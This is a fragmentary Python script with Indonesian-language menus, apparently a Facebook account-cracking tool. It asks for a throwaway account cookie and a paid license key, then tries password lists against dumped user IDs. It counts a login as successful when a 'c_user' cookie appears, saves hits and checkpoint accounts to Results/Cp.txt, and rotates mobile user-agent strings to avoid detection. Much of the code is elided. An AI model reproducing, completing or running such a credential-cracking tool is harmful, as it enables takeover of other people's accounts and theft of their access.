...
[bold purple] / /__/ _/_\ \/ _//    /\ \_/ /
[bold purple]/____/___/___/___/_/|_/___/___/

Untuk Login ini Script Beli lesensi Dulu / api key
...
[bold blue][02][bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭──────", subtitle_align="left", title="[bold green] (Login  Cookie)"))
        query = Console().input("[bold blue]   ╰─> ")
        if query == '1' or query == '01':
            Console(style="bold blue").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal, Pastikan Tidak Terkena[italic white] Checkpoint[italic white]!", subtitle="╭──────", subtitle_align="left", title="[bold blue]───[bold blue]───[bold blue]───[bold green] (KETERANGAN) [bold blue]───[bold blue]───[bold blue]───"))
...
[bold blue][04][bold white]. Keluar Dari Script([bold red]Logout[bold white])""", subtitle="╭──────", subtitle_align="left", title="[hot_green](MENU SCRIPT)"))
    query = Console().input("[bold blue]   ╰─> ")
    if query == '1' or query == '01':
        try:
...
[bold white]Hasil Crack[bold yellow] Cp[bold white] Tersimpan Di :[bold yellow] Results/Cp.txt""", title="[bold green](Hasil Crack)"))
            ...
            for pws in password:
                ...
                with requests.Session() as r:
                    ...
                    if 'c_user' in r.cookies.get_dict().keys():
                        ...
                        tree.add(f"[bold yellow]USER ID : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                        ...
                        continue
            self.looping += 1
            Console().print(f"[bold blue]   ╰─>[bold white] proses {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold yellow] Cp:-[bold yellow]{len(self.checkpoint)}[bold white]              ", end='\r')
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_version = random.choice(['12', '8.1.0', '9.0'])
            self.android_model = random.choice(['PGJM10', 'OS 7_1_2', 'ASUS_X00ID'])
            self.useragent = random.choice(['Mozilla/5.0 (Linux; U; Android {}; zh-hk; {} Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.61 Mobile Safari/537.36 HeyTapBrowser/40.8.9.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00ID) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36'.format(self.android_version, self.android_model, self.build, self.browser_version)])
